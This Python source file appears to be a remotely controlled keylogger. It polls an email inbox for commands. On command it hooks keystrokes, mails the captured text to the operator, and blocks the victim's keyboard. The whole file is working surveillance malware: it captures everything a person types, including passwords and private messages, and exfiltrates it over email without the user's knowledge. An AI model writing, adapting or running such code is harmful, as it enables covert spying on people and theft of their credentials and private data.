import pynput
import pynput.keyboard as kb
import keyboard
import gmailread as g

ishook = 0

BUFSIZE = 1024 

def on_press(key):
    global ishook, cont
    #cont = ""
    if ishook == 1:
        print("t: ", cont)
        try:
            cont += str(key.char)
        except AttributeError:
            if key == kb.Key.space:
                cont += ' '
            elif key == kb.Key.enter:
                cont += '\n'

def send_cont(cont):
    print("con:", cont)
    if cont == "":
        cont = "no input key"
    
    return cont

def lock_keyboard(islock):
    if islock == 1:
        # listener.stop()
        for i in range(150):
            keyboard.block_key(i)
    else:
        keyboard.unhook_all()
        # listener.start()
def keystroke():
    global listener
    listener = pynput.keyboard.Listener(on_press = on_press)
    listener.start()

def keylogger():
    global msg
    global listener
    global ishook, islock, cont
    ishook = 0
    islock = 0
    cont = ""
    while True:
        msg = g.read_mail()
        if (msg == "HOOK"):
            if ishook == 0:
                ishook = 1
                keystroke()
                g.send_mail("key_hook", "listen")
            else:
                ishook = 0
                listener.stop()
                g.send_mail("key_hook", "unlisten")  
        elif (msg == "PRINT"):
            g.send_mail("key_print", cont)
            cont = ""
        elif (msg == "LOCK"):
            if islock == 0:
                islock = 1
                lock_keyboard(islock)
                g.send_mail("key_hook", "lockkeyboard")
            else:
                islock = 0
                lock_keyboard(islock)
                g.send_mail("key_hook", "unlockkeyboard")
        elif msg == "QUIT":
            listener.stop()
            return
